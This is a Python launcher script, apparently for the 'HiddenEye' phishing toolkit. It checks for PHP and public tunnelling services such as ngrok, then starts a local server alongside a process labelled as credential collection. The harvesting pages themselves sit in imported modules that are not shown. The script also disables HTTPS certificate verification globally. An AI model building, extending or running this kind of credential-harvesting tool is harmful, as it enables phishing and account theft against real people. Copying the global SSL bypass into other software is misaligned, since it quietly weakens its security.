#!/usr/bin/python3
#
# HiddenEye by https://github.com/hackinter
#

from Defs.Languages import *
from Defs.Actions import *
from Defs.Configurations import *
from Defs.Checks import *
import multiprocessing
import gettext
import sys
import ssl
from os import system, environ

# Set default SSL context
if not environ.get('PYTHONHTTPSVERIFY', "") and getattr(ssl, '_create_unverified_context', None):
    ssl._create_default_https_context = ssl._create_unverified_context

# Color codes for terminal output
RED, WHITE, CYAN, GREEN, DEFAULT = '\033[91m', '\033[46m', '\033[36m', '\033[1;32m',  '\033[0m'

def main():
    checkPermissions()
    installGetText()
    languageSelector()
    checkConnection()
    verCheck()
    checkPHP()
    checkLocalxpose()
    checkNgrok()
    checkOpenport()
    checkPagekite()
    checkLT()
    ifSettingsNotExists()
    readConfig()

    try:
        runMainMenu()
        mainMenu()
        startProcesses()
    except KeyboardInterrupt:
        handleKeyboardInterrupt()

def startProcesses():
    """Start server and credential collection processes."""
    port = selectPort()
    multiprocessing.Process(target=runServer, args=(port,)).start()
    getCredentials(port)

def handleKeyboardInterrupt():
    """Handle keyboard interrupt gracefully."""
    port = '8080'  # Default port
    endMessage(port)
    exit()

if __name__ == "__main__":
    main()
